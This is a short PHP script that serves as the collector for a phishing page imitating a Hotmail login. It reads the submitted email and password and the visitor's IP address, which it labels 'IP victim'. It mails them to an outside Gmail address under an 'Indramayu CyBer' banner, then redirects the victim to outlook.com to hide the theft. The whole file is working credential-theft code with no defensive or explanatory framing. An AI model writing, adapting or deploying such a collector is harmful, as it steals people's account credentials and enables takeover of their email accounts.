<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['loginemail'];
$password = $_POST['passwd'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Hotmail Login Information";
mail("jesuswire80@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: http://outlook.com");
?>